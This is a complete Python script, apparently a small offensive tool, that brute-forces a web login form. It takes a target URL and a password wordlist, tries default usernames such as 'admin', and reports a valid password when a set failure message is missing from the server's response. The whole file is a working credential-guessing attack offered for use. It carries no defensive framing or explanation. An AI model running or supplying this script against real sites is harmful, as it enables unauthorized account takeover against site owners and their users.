import requests
import sys
import os
from termcolor import colored

if len(sys.argv) != 2:
    print("[!] REQUIRES A TARGET URL!!")
    print(colored(f"[!] CORRECT SYNTAX: python3 {sys.argv[0]} http://<TARGET URL>", 'green'))
    sys.exit()

print("-----------------------------------------")
print("##### PYTHON WEB LOGIN BRUTE-FORCER #####")
print("-----------------------------------------")

target = sys.argv[1]
usernames = ["test", "user", "admin"]
passwords = input("ENTER THE PATH TO PASSWORD LIST: ")
failuremsg = "Username or password invalid"

if not os.path.exists(passwords):
    print(f"[x] WORDLIST FILE NOT FOUND: {passwords}")
    print("[x] TRY TO ENTER THE FULL PATH TO THE WORDLIST FILE!!")
    exit()

while True:
    q = input(f"WOULD YOU LIKE TO KEEP THE DEFAULT USER LIST?[{usernames}] Y/N: ".upper())
    if q == "Y":
        print(f"OK, USING: {usernames}")
        break
    elif q == "N":
        usernames = input("ENTER A TARGET USERNAME: ")
        print(f"Bruteforcing {usernames}")
        break
    else:
        print("BRUTEFORCING WITH THE DEFAULT USER LIST..")
        break

print("-----------------------------------------")

try:
    for username in usernames:
        with open(passwords, "r") as wordlist:
            for password in wordlist:
                password = password.strip("\n").encode()
                sys.stdout.write(f"[x] ATTEMPTING USER:PASSWORD >> {username}:{password.decode()}\r")
                sys.stdout.flush()
                r = requests.post(target, data={"user": username, "pass": password})
                if failuremsg.encode() not in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write(f"\t {colored('[!] VALID PASSWORD:', 'green')} {password.decode()} {colored('FOUND FOR USER:', 'green')} {username}")
                    sys.exit()
            sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write(f"\t {colored('[!] NO VALID PASSWORD FOUND FOR USER:', 'red')} {username}")
            sys.stdout.write("\n")

except KeyboardInterrupt:
    print("\n[!] SCRIPT INTERRUPTED BY USER. EXITING...")
    sys.exit()
